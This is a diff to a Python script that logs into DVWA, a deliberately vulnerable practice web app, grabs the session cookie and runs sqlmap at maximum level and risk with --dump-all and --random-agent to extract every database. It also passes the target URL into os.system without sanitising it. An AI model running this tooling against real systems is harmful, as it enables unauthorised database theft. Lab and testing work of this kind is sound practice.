@@ -28,15 +28,33 @@ def get_session_id():
         }
 
         # Perform login
-        session.post(login_url, data=payload)
+        post_response = session.post(login_url, data=payload)
         
         # Retrieve PHPSESSID from cookies
         session_id = session.cookies.get('PHPSESSID')
+
+        # Check if login was successful
+        if "Welcome to Damn Vulnerable Web Application" in post_response.text:
+            print("Login successful. Session ID:", session_id)
+        else:
+            print("Login failed. Check your credentials and DVWA configuration.")
+            session_id = None
+        
         return session_id
 
 # Running SQLMap to detect SQL injection
 def run_sqlmap(target_url, session_id):
-    os.system(f"sqlmap -u {target_url} --cookie='PHPSESSID={session_id}; security=low' --dbs --batch --level=1 --risk=1")
+    if session_id:
+        # More aggressive SQLMap options for full-fledged SQL injection testing
+        sqlmap_command = (
+            f"sqlmap -u {target_url} "
+            f"--cookie='PHPSESSID={session_id}; security=low' "
+            "--batch --level=5 --risk=3 --dbs --tables --columns --dump-all --random-agent --threads=5"
+        )
+        print(f"Running SQLMap with command: {sqlmap_command}")
+        os.system(sqlmap_command)
+    else:
+        print("No valid session ID. SQLMap will not run.")
 
 if __name__ == "__main__":
     session_id = get_session_id()
